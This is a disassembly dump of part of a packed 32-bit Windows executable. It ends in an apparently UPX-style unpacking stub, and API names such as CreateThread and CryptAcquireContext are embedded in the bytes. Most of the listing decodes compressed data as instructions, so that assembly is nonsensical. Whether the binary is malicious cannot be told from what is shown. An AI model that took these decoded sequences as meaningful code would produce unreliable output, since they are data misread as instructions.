  40e859:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40e85a:	69 8a f6 83 60 71 a6 	imul   $0xa69a69a6,0x716083f6(%edx),%ecx
  40e861:	69 9a a6 
  40e864:	6e                   	outsb  %ds:(%esi),(%dx)
  40e865:	21 dd                	and    %ebx,%ebp
  40e867:	3e e6 9a             	ds out %al,$0x9a
  40e86a:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40e86b:	69 9a 54 c4 06 50 98 	imul   $0x9a69bd98,0x5006c454(%edx),%ebx
  40e872:	bd 69 9a 
  40e875:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40e876:	69 40 d9 e8 89 19 a6 	imul   $0xa61989e8,-0x27(%eax),%eax
  40e87d:	69 9a a6 c8 7c 42 84 	imul   $0xa69a0084,0x427cc8a6(%edx),%ebx
  40e884:	00 9a a6 
  40e887:	69 9a 80 2b 11 5a 0e 	imul   $0x9a69850e,0x5a112b80(%edx),%ebx
  40e88e:	85 69 9a 
  40e891:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40e892:	69 ae 2d 0f 5c 5b a6 	imul   $0xa69a69a6,0x5b5c0f2d(%esi),%ebp
  40e899:	69 9a a6 
  40e89c:	36 0a 57 ee          	or     %ss:-0x12(%edi),%dl
  40e8a0:	9b                   	fwait
  40e8a1:	9a a6 69 9a c0 dc 77 	lcall  $0x77dc,$0xc09a69a6
  40e8a8:	12 93 a0 69 9a a6    	adc    -0x59659660(%ebx),%dl
  40e8ae:	69 22 1b 09 8b b6    	imul   $0xb68b091b,(%edx),%esp
  40e8b4:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40e8b5:	69 9a a6 1e f1 75 99 	imul   $0xa69a7f99,0x75f11ea6(%edx),%ebx
  40e8bc:	7f 9a a6 
  40e8bf:	69 9a 01 72 66 fb 43 	imul   $0x9a692343,-0x4998dff(%edx),%ebx
  40e8c6:	23 69 9a 
  40e8c9:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40e8ca:	69 ed e4 31 63 97    	imul   $0x976331e4,%ebp,%ebp
  40e8d0:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40e8d1:	69 9a a6 c6 4a bb f9 	imul   $0xa69a29f9,-0x44b5395a(%edx),%ebx
  40e8d8:	29 9a a6 
  40e8db:	69 9a 9e b2 86 c1 b3 	imul   $0x9a6970b3,-0x3e794d62(%edx),%ebx
  40e8e2:	70 69 9a 
  40e8e5:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40e8e6:	69 94 e9 fc f0 7d a6 	imul   $0x33a69a69,-0x59820f04(%ecx,%ebp,8),%edx
  40e8ed:	69 9a a6 33 
  40e8f1:	49                   	dec    %ecx
  40e8f2:	38 ca                	cmp    %cl,%dl
  40e8f4:	d4 9a                	aam    $0x9a
  40e8f6:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40e8f7:	69 9a f5 7a b7 ad 3a 	imul   $0x9a69783a,-0x5248850b(%edx),%ebx
  40e8fe:	78 69 9a 
  40e901:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40e902:	69 5f 7e 8d d8 39 a6 	imul   $0xa639d88d,0x7e(%edi),%ebx
  40e909:	69 9a a6 c3 5d d0 d5 	imul   $0xa69a25d5,-0x2fa23c5a(%edx),%ebx
  40e910:	25 9a a6 
  40e913:	69 9a ac 18 9c 3b 26 	imul   $0x9a695926,0x3b9c18ac(%edx),%ebx
  40e91a:	59 69 9a 
  40e91d:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40e91e:	69 9a 4f 95 ff bc a6 	imul   $0xa69a69a6,-0x43006ab1(%edx),%ebx
  40e925:	69 9a a6 
  40e928:	15 e7 6f 9f b0       	adc    $0xb09f6fe7,%eax
  40e92d:	9a a6 69 9a a4 3f a5 	lcall  $0xa53f,$0xa49a69a6
  40e934:	a2 4e 82 69 9a       	mov    %al,0x9a69824e
  40e939:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40e93a:	69 90 a7 04 ec cd a6 	imul   $0xa69a69a6,-0x3213fb59(%eax),%edx
  40e941:	69 9a a6 
  40e944:	91                   	xchg   %eax,%ecx
  40e945:	4d                   	dec    %ebp
  40e946:	ef                   	out    %eax,(%dx)
  40e947:	aa                   	stos   %al,%es:(%edi)
  40e948:	96                   	xchg   %eax,%esi
  40e949:	9a a6 69 9a d1 6a 2c 	lcall  $0x2c6a,$0xd19a69a6
  40e950:	65 5e                	gs pop %esi
  40e952:	8c 69 9a             	mov    %gs,-0x66(%ecx)
  40e955:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40e956:	69 87 0b 67 db 10 a6 	imul   $0xa69a69a6,0x10db670b(%edi),%eax
  40e95d:	69 9a a6 
  40e960:	d6                   	salc
  40e961:	d7                   	xlat   %ds:(%ebx)
  40e962:	a1 f8 13 9a a6       	mov    0xa69a13f8,%eax
  40e967:	69 9a a9 61 1c 47 d2 	imul   $0x9a69f2d2,0x471c61a9(%edx),%ebx
  40e96e:	f2 69 9a 
  40e971:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40e972:	69 14 c7 f7 fd 3d a6 	imul   $0xa63dfdf7,(%edi,%eax,8),%edx
  40e979:	69 9a a6 44 af 68 24 	imul   $0xa69aa324,0x68af44a6(%edx),%ebx
  40e980:	a3 9a a6 
  40e983:	69 9a 1d e2 3c 0d a8 	imul   $0x9a690ca8,0xd3ce21d(%edx),%ebx
  40e98a:	0c 69 9a 
  40e98d:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40e98e:	69 b4 56 cb 32 6c d3 	imul   $0xb8a68239,-0x2c93cd35(%esi,%edx,2),%esi
  40e995:	39 82 a6 b8 
  40e999:	01 13                	add    %edx,(%ebx)
  40e99b:	03 04 4d d3 34 4d 08 	add    0x84d34d3(,%ecx,2),%eax
  40e9a2:	10 20                	adc    %ah,(%eax)
  40e9a4:	40                   	inc    %eax
  40e9a5:	80 1b d3             	sbbb   $0xd3,(%ebx)
  40e9a8:	34 df                	xor    $0xdf,%al
  40e9aa:	34 36                	xor    $0x36,%al
  40e9ac:	70 43                	jo     0x40e9f1
  40e9ae:	40                   	inc    %eax
  40e9af:	00 48 28             	add    %cl,0x28(%eax)
  40e9b2:	18 74 7f f2          	sbb    %dh,-0xe(%edi,%edi,2)
  40e9b6:	6c                   	insb   (%dx),%es:(%edi)
  40e9b7:	ec                   	in     (%dx),%al
  40e9b8:	42                   	inc    %edx
  40e9b9:	0f d4 42 20          	paddq  0x20(%edx),%mm0
  40e9bd:	04 43                	add    $0x43,%al
  40e9bf:	04 41                	add    $0x41,%al
  40e9c1:	01 3a                	add    %edi,(%edx)
  40e9c3:	c1 46 b0 11          	roll   $0x11,-0x50(%esi)
  40e9c7:	ef                   	out    %eax,(%dx)
  40e9c8:	39 e7                	cmp    %esp,%edi
  40e9ca:	28 2f                	sub    %ch,(%edi)
  40e9cc:	6f                   	outsl  %ds:(%esi),(%dx)
  40e9cd:	04 4b                	add    $0x4b,%al
  40e9cf:	35 75 d1 73 00       	xor    $0x73d175,%eax
  40e9d4:	69 6e 00 29 34 f7 11 	imul   $0x11f73429,0x0(%esi),%ebp
  40e9db:	74 43                	je     0x40ea20
  40e9dd:	45                   	inc    %ebp
  40e9de:	cb                   	lret
  40e9df:	6c                   	insb   (%dx),%es:(%edi)
  40e9e0:	11 15 7c 8e c0 04    	adc    %edx,0x4c08e7c
  40e9e6:	30 e1                	xor    %ah,%cl
  40e9e8:	11 75 e8             	adc    %esi,-0x18(%ebp)
  40e9eb:	be b2 11 a3 67       	mov    $0x67a311b2,%esi
  40e9f0:	00 73 07             	add    %dh,0x7(%ebx)
  40e9f3:	74 3b                	je     0x40ea30
  40e9f5:	ac                   	lods   %ds:(%esi),%al
  40e9f6:	0d 23 f7 0d 00       	or     $0xdf723,%eax
  40e9fb:	57                   	push   %edi
  40e9fc:	11 1b                	adc    %ebx,(%ebx)
  40e9fe:	7b 29                	jnp    0x40ea29
  40ea00:	18 33                	sbb    %dh,(%ebx)
  40ea02:	79 5f                	jns    0x40ea63
  40ea04:	00 44 41 6b          	add    %al,0x6b(%ecx,%eax,2)
  40ea08:	07                   	pop    %es
  40ea09:	b7 3d                	mov    $0x3d,%bh
  40ea0b:	82 ae 72 09 76 dd 1f 	subb   $0x1f,-0x2289f68e(%esi)
  40ea12:	48                   	dec    %eax
  40ea13:	5f                   	pop    %edi
  40ea14:	98                   	cwtl
  40ea15:	ae                   	scas   %es:(%edi),%al
  40ea16:	eb 36                	jmp    0x40ea4e
  40ea18:	73 45                	jae    0x40ea5f
  40ea1a:	0b 44 11 76          	or     0x76(%ecx,%edx,1),%eax
  40ea1e:	19 63 b0             	sbb    %esp,-0x50(%ebx)
  40ea21:	bb cd 11 f5 11       	mov    $0x11f511cd,%ebx
  40ea26:	3d 03 22 00 5c       	cmp    $0x5c002203,%eax
  40ea2b:	01 e0                	add    %esp,%eax
  40ea2d:	ee                   	out    %al,(%dx)
  40ea2e:	6e                   	outsb  %ds:(%esi),(%dx)
  40ea2f:	6c                   	insb   (%dx),%es:(%edi)
  40ea30:	2e 05 50 31 59 00    	cs add $0x593150,%eax
  40ea36:	53                   	push   %ebx
  40ea37:	21 43 00             	and    %eax,0x0(%ebx)
  40ea3a:	41                   	inc    %ecx
  40ea3b:	5c                   	pop    %esp
  40ea3c:	b7 95                	mov    $0x95,%bh
  40ea3e:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40ea3f:	e7 44                	out    %eax,$0x44
  40ea41:	0b 56 41             	or     0x41(%esi),%edx
  40ea44:	30 2b                	xor    %ch,(%ebx)
  40ea46:	79 0a                	jns    0x40ea52
  40ea48:	de f6                	fdivp  %st,%st(6)
  40ea4a:	00 1b                	add    %bl,(%ebx)
  40ea4c:	65 61                	gs popa
  40ea4e:	91                   	xchg   %eax,%ecx
  40ea4f:	4e                   	dec    %esi
  40ea50:	65 dd 17             	fstl   %gs:(%edi)
  40ea53:	7b 6d                	jnp    0x40eac2
  40ea55:	00 62 11             	add    %ah,0x11(%edx)
  40ea58:	00 50 11             	add    %dl,0x11(%eax)
  40ea5b:	50                   	push   %eax
  40ea5c:	69 7b 0a ba 2f 33 69 	imul   $0x69332fba,0xa(%ebx),%edi
  40ea63:	b7 6e                	mov    $0x6e,%bh
  40ea65:	bb 75 2b 37 65       	mov    $0x65372b75,%ebx
  40ea6a:	77 9f                	ja     0x40ea0b
  40ea6c:	d5 25                	aad    $0x25
  40ea6e:	51                   	push   %ecx
  40ea6f:	38 00                	cmp    %al,(%eax)
  40ea71:	58                   	pop    %eax
  40ea72:	c7 42 33 b1 ee c8 5c 	movl   $0x5cc8eeb1,0x33(%edx)
  40ea79:	4f                   	dec    %edi
  40ea7a:	31 17                	xor    %edx,(%edi)
  40ea7c:	50                   	push   %eax
  40ea7d:	37                   	aaa
  40ea7e:	6f                   	outsl  %ds:(%esi),(%dx)
  40ea7f:	53                   	push   %ebx
  40ea80:	7b a6                	jnp    0x40ea28
  40ea82:	7b 0f                	jnp    0x40ea93
  40ea84:	3f                   	aas
  40ea85:	6f                   	outsl  %ds:(%esi),(%dx)
  40ea86:	71 7f                	jno    0x40eb07
  40ea88:	61                   	popa
  40ea89:	4d                   	dec    %ebp
  40ea8a:	4f                   	dec    %edi
  40ea8b:	d8 94 30 39 32 2f 2e 	fcoms  0x2e2f3239(%eax,%esi,1)
  40ea92:	09 05 04 48 d0 69    	or     %eax,0x69d04804
  40ea98:	9c                   	pushf
  40ea99:	41                   	inc    %ecx
  40ea9a:	ba 8d 1e 9e 14       	mov    $0x149e1e8d,%edx
  40ea9f:	23 a7 03 b6 2e 9b    	and    -0x64d149fd(%edi),%esp
  40eaa5:	6e                   	outsb  %ds:(%esi),(%dx)
  40eaa6:	90                   	nop
  40eaa7:	b0 bf                	mov    $0xbf,%al
  40eaa9:	07                   	pop    %es
  40eaaa:	d9 04 66             	flds   (%esi,%eiz,2)
  40eaad:	c0 65 2c 8e          	shlb   $0x8e,0x2c(%ebp)
  40eab1:	35 6f 00 09 04       	xor    $0x409006f,%eax
  40eab6:	e0 d0                	loopne 0x40ea88
  40eab8:	0b 19                	or     (%ecx),%ebx
  40eaba:	04 c8                	add    $0xc8,%al
  40eabc:	58                   	pop    %eax
  40eabd:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40eabe:	02 02                	add    (%edx),%al
  40eac0:	90                   	nop
  40eac1:	04 08                	add    $0x8,%al
  40eac3:	14 55                	adc    $0x55,%al
  40eac5:	04 c8                	add    $0xc8,%al
  40eac7:	07                   	pop    %es
  40eac8:	a2 82 01 00 ff       	mov    %al,0xff000182
  40eacd:	ff 36                	push   (%esi)
  40eacf:	27                   	daa
  40ead0:	3f                   	aas
  40ead1:	ff 04 00             	incl   (%eax,%eax,1)
  40ead4:	48                   	dec    %eax
  40ead5:	08 ca                	or     %cl,%dl
  40ead7:	80 02 c8             	addb   $0xc8,(%edx)
  40eada:	00 28                	add    %ch,(%eax)
  40eadc:	08 01                	or     %al,(%ecx)
  40eade:	4d                   	dec    %ebp
  40eadf:	03 a2 db 28 9d 20    	add    0x209d28db(%edx),%esp
  40eae5:	03 68 6d             	add    0x6d(%eax),%ebp
  40eae8:	d0 6c a7 e2          	shrb   $1,-0x1e(%edi,%eiz,4)
  40eaec:	6c                   	insb   (%dx),%es:(%edi)
  40eaed:	5b                   	pop    %ebx
  40eaee:	07                   	pop    %es
  40eaef:	67 32 ed             	addr16 xor %ch,%ch
  40eaf2:	52                   	push   %edx
  40eaf3:	71 09                	jno    0x40eafe
  40eaf5:	2c 07                	sub    $0x7,%al
  40eaf7:	0e                   	push   %cs
  40eaf8:	05 00 01 2a 9c       	add    $0x9c2a0100,%eax
  40eafd:	a1 ea be 00 1e       	mov    0x1e00beea,%eax
  40eb02:	da 59 c8             	ficompl -0x38(%ecx)
  40eb05:	ff 5f e6             	lcall  *-0x1a(%edi)
  40eb08:	39 1f                	cmp    %ebx,(%edi)
  40eb0a:	44                   	inc    %esp
  40eb0b:	08 81 50 0a 00 0f    	or     %al,0xf000a50(%ecx)
  40eb11:	00 b4 00 0e 00 02 05 	add    %dh,0x502000e(%eax,%eax,1)
  40eb18:	05 21 c0 81 6a       	add    $0x6a81c021,%eax
  40eb1d:	22 2a                	and    (%edx),%ch
  40eb1f:	00 81 36 55 51 14    	add    %al,0x14515536(%ecx)
  40eb25:	36 03 eb             	ss add %ebx,%ebp
  40eb28:	fe                   	(bad)
  40eb29:	97                   	xchg   %eax,%edi
  40eb2a:	cd ec                	int    $0xec
  40eb2c:	24 30                	and    $0x30,%al
  40eb2e:	01 43 72             	add    %eax,0x72(%ebx)
  40eb31:	65 61                	gs popa
  40eb33:	74 65                	je     0x40eb9a
  40eb35:	54                   	push   %esp
  40eb36:	68 06 64 0d fb       	push   $0xfb0d6406
  40eb3b:	7f fb                	jg     0x40eb38
  40eb3d:	7f 45                	jg     0x40eb84
  40eb3f:	78 69                	js     0x40ebaa
  40eb41:	74 50                	je     0x40eb93
  40eb43:	72 6f                	jb     0x40ebb4
  40eb45:	63 65 73             	arpl   %esp,0x73(%ebp)
  40eb48:	73 0c                	jae    0x40eb56
  40eb4a:	47                   	inc    %edi
  40eb4b:	65 74 4d             	gs je  0x40eb9b
  40eb4e:	6f                   	outsl  %ds:(%esi),(%dx)
  40eb4f:	64 75 6c             	fs jne 0x40ebbe
  40eb52:	65 46                	gs inc %esi
  40eb54:	69 03 f6 87 cd 7e    	imul   $0x7ecd87f6,(%ebx),%eax
  40eb5a:	4e                   	dec    %esi
  40eb5b:	61                   	popa
  40eb5c:	6d                   	insl   (%dx),%es:(%edi)
  40eb5d:	65 57                	gs push %edi
  40eb5f:	20 2c 6c             	and    %ch,(%esp,%ebp,2)
  40eb62:	73 74                	jae    0x40ebd8
  40eb64:	72 63                	jb     0x40ebc9
  40eb66:	3c 6e                	cmp    $0x6e,%al
  40eb68:	df 0f                	fisttps (%edi)
  40eb6a:	d8 57 29             	fcoms  0x29(%edi)
  40eb6d:	48                   	dec    %eax
  40eb6e:	61                   	popa
  40eb6f:	6e                   	outsb  %ds:(%esi),(%dx)
  40eb70:	64 6c                	fs insb (%dx),%es:(%edi)
  40eb72:	27                   	daa
  40eb73:	48                   	dec    %eax
  40eb74:	21 70 46             	and    %esi,0x46(%eax)
  40eb77:	b7 f6                	mov    $0xf6,%bh
  40eb79:	1f                   	pop    %ds
  40eb7a:	db 26                	(bad) (%esi)
  40eb7c:	65 1b 55 73          	sbb    %gs:0x73(%ebp),%edx
  40eb80:	65 72 44             	gs jb  0x40ebc7
  40eb83:	65 66 61             	gs popaw
  40eb86:	20 0a                	and    %cl,(%edx)
  40eb88:	49                   	dec    %ecx
  40eb89:	4c                   	dec    %esp
  40eb8a:	e7 6e                	out    %eax,$0x6e
  40eb8c:	b3 6f                	mov    $0x6f,%bl
  40eb8e:	22 67 75             	and    0x75(%edi),%ah
  40eb91:	61                   	popa
  40eb92:	67 19 6b 69          	sbb    %ebp,0x69(%bp,%di)
  40eb96:	76 7e                	jbe    0x40ec16
  40eb98:	72 9b                	jb     0x40eb35
  40eb9a:	fc                   	cld
  40eb9b:	bd 5d 66 63 49       	mov    $0x4963665d,%ebp
  40eba0:	6e                   	outsb  %ds:(%esi),(%dx)
  40eba1:	4c                   	dec    %esp
  40eba2:	56                   	push   %esi
  40eba3:	6c                   	insb   (%dx),%es:(%edi)
  40eba4:	65 6e                	outsb  %gs:(%esi),(%dx)
  40eba6:	8c 5b fb             	mov    %ds,-0x5(%ebx)
  40eba9:	ec                   	in     (%dx),%al
  40ebaa:	05 4e 54 41 6c       	add    $0x6c41544e,%eax
  40ebaf:	6c                   	insb   (%dx),%es:(%edi)
  40ebb0:	11 bf f9 76 fb 9f    	adc    %edi,-0x60048907(%edi)
  40ebb6:	34 00                	xor    $0x0,%al
  40ebb8:	79 70                	jns    0x40ec2a
  40ebba:	74 41                	je     0x40ebfd
  40ebbc:	63 71 75             	arpl   %esi,0x75(%ecx)
  40ebbf:	69 6d 43 6f 40 fd e6 	imul   $0xe6fd406f,0x43(%ebp),%ebp
  40ebc6:	62 ef 65             	(bad) {rz-bad}
  40ebc9:	78 43                	js     0x40ec0e
  40ebcb:	15 3e 8f 73 68       	adc    $0x68738f3e,%eax
  40ebd0:	50                   	push   %eax
  40ebd1:	61                   	popa
  40ebd2:	72 60                	jb     0x40ec34
  40ebd4:	6f                   	outsl  %ds:(%esi),(%dx)
  40ebd5:	16                   	push   %ss
  40ebd6:	ac                   	lods   %ds:(%esi),%al
  40ebd7:	bb 12 ed 15 10       	mov    $0x1015ed12,%ebx
  40ebdc:	7d 01                	jge    0x40ebdf
  40ebde:	db b5 96 6d 6f 79    	(bad) 0x796f6d96(%ebp)
  40ebe4:	11 0a                	adc    %ecx,(%edx)
  40ebe6:	44                   	inc    %esp
  40ebe7:	b0 d6                	mov    $0xd6,%al
  40ebe9:	0e                   	push   %cs
  40ebea:	b6 24                	mov    $0x24,%dh
  40ebec:	61                   	popa
  40ebed:	0e                   	push   %cs
  40ebee:	52                   	push   %edx
  40ebef:	65 8b 11             	mov    %gs:(%ecx),%edx
  40ebf2:	5a                   	pop    %edx
  40ebf3:	85 76 96             	test   %esi,-0x6a(%esi)
  40ebf6:	db 78 06             	fstpt  0x6(%eax)
  40ebf9:	01 1c ac             	add    %ebx,(%esp,%ebp,4)
  40ebfc:	09 a1 b5 d7 6e 15    	or     %esp,0x156ed7b5(%ecx)
  40ec02:	6d                   	insl   (%dx),%es:(%edi)
  40ec03:	6d                   	insl   (%dx),%es:(%edi)
  40ec04:	18 1b                	sbb    %bl,(%ebx)
  40ec06:	43                   	inc    %ebx
  40ec07:	b6 1b                	mov    $0x1b,%dh
  40ec09:	ff 8d 35 5b 1e 13    	decl   0x131e5b35(%ebp)
  40ec0f:	90                   	nop
  40ec10:	97                   	xchg   %eax,%edi
  40ec11:	6f                   	outsl  %ds:(%esi),(%dx)
  40ec12:	20 69 61             	and    %ch,0x61(%ecx)
  40ec15:	6c                   	insb   (%dx),%es:(%edi)
  40ec16:	69 7a 6b db c7 be 65 	imul   $0x65bec7db,0x6b(%edx),%edi
  40ec1d:	0d 53 cb 78 79       	or     $0x7978cb53,%eax
  40ec22:	42                   	inc    %edx
  40ec23:	6c                   	insb   (%dx),%es:(%edi)
  40ec24:	ff 6b 0b             	ljmp   *0xb(%ebx)
  40ec27:	12 6b ad             	adc    -0x53(%ebx),%ch
  40ec2a:	b5 d9                	mov    $0xd9,%ch
  40ec2c:	8c 26                	mov    %fs,(%esi)
  40ec2e:	81 12 e4 32 6f 09    	adcl   $0x96f32e4,(%edx)
  40ec34:	73 0b                	jae    0x40ec41
  40ec36:	4b                   	dec    %ebx
  40ec37:	0f 3e                	(bad)
  40ec39:	63 75 72             	arpl   %esi,0x72(%ebp)
  40ec3c:	5b                   	pop    %ebx
  40ec3d:	b2 f2                	mov    $0xf2,%dl
  40ec3f:	6d                   	insl   (%dx),%es:(%edi)
  40ec40:	0c 79                	or     $0x79,%al
  40ec42:	15 55 17 71 1d       	adc    $0x1d711755,%eax
  40ec47:	9f                   	lahf
  40ec48:	66 db 34 58          	data16 (bad) (%eax,%ebx,2)
  40ec4c:	ff 09                	decl   (%ecx)
  40ec4e:	9c                   	pushf
  40ec4f:	2a 60 50             	sub    0x50(%eax),%ah
  40ec52:	61                   	popa
  40ec53:	b6 7d                	mov    $0x7d,%dh
  40ec55:	68 cd 74 68 62       	push   $0x626874cd
  40ec5a:	28 8c 77 76 63 70 3d 	sub    %cl,0x3d706376(%edi,%esi,2)
  40ec61:	c2 d6 66             	ret    $0x66d6
  40ec64:	b7 a5                	mov    $0xa5,%bh
  40ec66:	66 57                	push   %di
  40ec68:	1a d4                	sbb    %ah,%dl
  40ec6a:	b6 76                	mov    $0x76,%dh
  40ec6c:	d6                   	salc
  40ec6d:	7c 9a                	jl     0x40ec09
  40ec6f:	6d                   	insl   (%dx),%es:(%edi)
  40ec70:	3b 53 70             	cmp    0x70(%ebx),%edx
  40ec73:	58                   	pop    %eax
  40ec74:	57                   	push   %edi
  40ec75:	38 36                	cmp    %dh,(%esi)
  40ec77:	70 4c                	jo     0x40ecc5
  40ec79:	6f                   	outsl  %ds:(%esi),(%dx)
  40ec7a:	b7 ce                	mov    $0xce,%bh
  40ec7c:	19 2e                	sbb    %ebp,(%esi)
  40ec7e:	d9 49 6d             	(bad) 0x6d(%ecx)
  40ec81:	9e                   	sahf
  40ec82:	29 b2 57 34 64 6f    	sub    %esi,0x6f643457(%edx)
  40ec88:	cc                   	int3
  40ec89:	b0 bd                	mov    $0xbd,%al
  40ec8b:	c3                   	ret
  40ec8c:	77 54                	ja     0x40ece2
  40ec8e:	54                   	push   %esp
  40ec8f:	0f 0c                	(bad)
  40ec91:	4d                   	dec    %ebp
  40ec92:	8c 1d 6d 83 6d 9f    	mov    %ds,0x9f6d836d
  40ec98:	44                   	inc    %esp
  40ec99:	6c                   	insb   (%dx),%es:(%edi)
  40ec9a:	67 49                	addr16 dec %ecx
  40ec9c:	c0 6d 1e 45          	shrb   $0x45,0x1e(%ebp)
  40eca0:	1d 44 11 da 59       	sbb    $0x59da1144,%eax
  40eca5:	db 94 6f 67 0a 07 42 	fistl  0x42070a67(%edi,%ebp,2)
  40ecac:	ee                   	out    %al,(%dx)
  40ecad:	7b ff                	jnp    0x40ecae
  40ecaf:	43                   	inc    %ebx
  40ecb0:	25 7b 81 7f 6b       	and    $0x6b7f817b,%eax
  40ecb5:	50                   	push   %eax
  40ecb6:	45                   	inc    %ebp
  40ecb7:	00 00                	add    %al,(%eax)
  40ecb9:	4c                   	dec    %esp
  40ecba:	01 04 66             	add    %eax,(%esi,%eiz,2)
  40ecbd:	fb                   	sti
  40ecbe:	07                   	pop    %es
  40ecbf:	f9                   	stc
  40ecc0:	00 40 64             	add    %al,0x64(%eax)
  40ecc3:	0d 4f e0 00 03       	or     $0x300e04f,%eax
  40ecc8:	01 0b                	add    %ecx,(%ebx)
  40ecca:	01 0a                	add    %ecx,(%edx)
  40eccc:	0c 28                	or     $0x28,%al
  40ecce:	c9                   	leave
  40eccf:	56                   	push   %esi
  40ecd0:	d1 b3 7c 13 b2 18    	shll   $1,0x18b2137c(%ebx)
  40ecd6:	fe                   	(bad)
  40ecd7:	10 e6                	adc    %ah,%dh
  40ecd9:	da f2                	(bad)
  40ecdb:	bd 04 0b 02 05       	mov    $0x5020b04,%ebp
  40ece0:	51                   	push   %ecx
  40ece1:	01 07                	add    %eax,(%edi)
  40ece3:	36 01 6a 6c          	add    %ebp,%ss:0x6c(%edx)
  40ece7:	00 d0                	add    %dl,%al
  40ece9:	32 1e                	xor    (%esi),%bl
  40eceb:	f6 96 bd 77 81 28    	notb   0x288177bd(%esi)
  40ecf1:	02 07                	add    (%edi),%al
  40ecf3:	06                   	push   %es
  40ecf4:	00 aa e3 d9 5e 74    	add    %ch,0x745ed9e3(%edx)
  40ecfa:	67 08 a0 90 44       	or     %ah,0x4490(%bx,%si)
  40ecff:	3a 64 dd 0a          	cmp    0xa(%ebp,%ebx,8),%ah
  40ed03:	10 ed                	adc    %ch,%ch
  40ed05:	a2 ac 1e 2f d8       	mov    %al,0xd82f1eac
  40ed0a:	67 0c 2e             	addr16 or $0x2e,%al
  40ed0d:	43                   	inc    %ebx
  40ed0e:	00 d1                	add    %dl,%cl
  40ed10:	27                   	daa
  40ed11:	90                   	nop
  40ed12:	eb 39                	jmp    0x40ed4d
  40ed14:	6e                   	outsb  %ds:(%esi),(%dx)
  40ed15:	b8 b0 04 23 20       	mov    $0x202304b0,%eax
  40ed1a:	c2 2e 72             	ret    $0x722e
  40ed1d:	64 81 53 f6 06 b9 fb 	adcl   $0x8afbb906,%fs:-0xa(%ebx)
  40ed24:	8a 
  40ed25:	2b 2c 03             	sub    (%ebx,%eax,1),%ebp
  40ed28:	6a 40                	push   $0x40
  40ed2a:	d2 bd ee b3 2e 26    	sarb   %cl,0x262eb3ee(%ebp)
  40ed30:	00 48 12             	add    %cl,0x12(%eax)
  40ed33:	04 70                	add    $0x70,%al
  40ed35:	fc                   	cld
  40ed36:	27                   	daa
  40ed37:	58                   	pop    %eax
  40ed38:	9d                   	popf
  40ed39:	99                   	cltd
  40ed3a:	6e                   	outsb  %ds:(%esi),(%dx)
  40ed3b:	53                   	push   %ebx
  40ed3c:	c0 4f 73 72          	rorb   $0x72,0x73(%edi)
  40ed40:	34 eb                	xor    $0xeb,%al
  40ed42:	90                   	nop
  40ed43:	5d                   	pop    %ebp
  40ed44:	5b                   	pop    %ebx
  40ed45:	49                   	dec    %ecx
  40ed46:	d3 4f 3c             	rorl   %cl,0x3c(%edi)
  40ed49:	5a                   	pop    %edx
  40ed4a:	29 2c 68             	sub    %ebp,(%eax,%ebp,2)
  40ed4d:	00 00                	add    %al,(%eax)
  40ed4f:	80 7f 0d 7e          	cmpb   $0x7e,0xd(%edi)
  40ed53:	c2 00 00             	ret    $0x0
  40ed56:	40                   	inc    %eax
  40ed57:	02 00                	add    (%eax),%al
  40ed59:	00 ff                	add    %bh,%bh
  40ed5b:	00 00                	add    %al,(%eax)
  40ed5d:	00 00                	add    %al,(%eax)
  40ed5f:	00 60 be             	add    %ah,-0x42(%eax)
  40ed62:	00 c0                	add    %al,%al
  40ed64:	40                   	inc    %eax
  40ed65:	00 8d be 00 50 ff    	add    %cl,-0xafff42(%ebp)
  40ed6b:	ff 57 eb             	call   *-0x15(%edi)
  40ed6e:	0b 90 8a 06 46 88    	or     -0x77b9f976(%eax),%edx
  40ed74:	07                   	pop    %es
  40ed75:	47                   	inc    %edi
  40ed76:	01 db                	add    %ebx,%ebx
  40ed78:	75 07                	jne    0x40ed81
  40ed7a:	8b 1e                	mov    (%esi),%ebx
  40ed7c:	83 ee fc             	sub    $0xfffffffc,%esi
  40ed7f:	11 db                	adc    %ebx,%ebx
  40ed81:	72 ed                	jb     0x40ed70
  40ed83:	b8 01 00 00 00       	mov    $0x1,%eax
  40ed88:	01 db                	add    %ebx,%ebx
  40ed8a:	75 07                	jne    0x40ed93
  40ed8c:	8b 1e                	mov    (%esi),%ebx
  40ed8e:	83 ee fc             	sub    $0xfffffffc,%esi
  40ed91:	11 db                	adc    %ebx,%ebx
  40ed93:	11 c0                	adc    %eax,%eax
  40ed95:	01 db                	add    %ebx,%ebx
  40ed97:	73 ef                	jae    0x40ed88
  40ed99:	75 09                	jne    0x40eda4
  40ed9b:	8b 1e                	mov    (%esi),%ebx
  40ed9d:	83 ee fc             	sub    $0xfffffffc,%esi
  40eda0:	11 db                	adc    %ebx,%ebx
  40eda2:	73 e4                	jae    0x40ed88
  40eda4:	31 c9                	xor    %ecx,%ecx
  40eda6:	83 e8 03             	sub    $0x3,%eax
  40eda9:	72 0d                	jb     0x40edb8
  40edab:	c1 e0 08             	shl    $0x8,%eax
  40edae:	8a 06                	mov    (%esi),%al
  40edb0:	46                   	inc    %esi
  40edb1:	83 f0 ff             	xor    $0xffffffff,%eax
  40edb4:	74 74                	je     0x40ee2a
  40edb6:	89 c5                	mov    %eax,%ebp
  40edb8:	01 db                	add    %ebx,%ebx
  40edba:	75 07                	jne    0x40edc3
  40edbc:	8b 1e                	mov    (%esi),%ebx
  40edbe:	83 ee fc             	sub    $0xfffffffc,%esi
  40edc1:	11 db                	adc    %ebx,%ebx
  40edc3:	11 c9                	adc    %ecx,%ecx
  40edc5:	01 db                	add    %ebx,%ebx
  40edc7:	75 07                	jne    0x40edd0
  40edc9:	8b 1e                	mov    (%esi),%ebx
  40edcb:	83 ee fc             	sub    $0xfffffffc,%esi
  40edce:	11 db                	adc    %ebx,%ebx
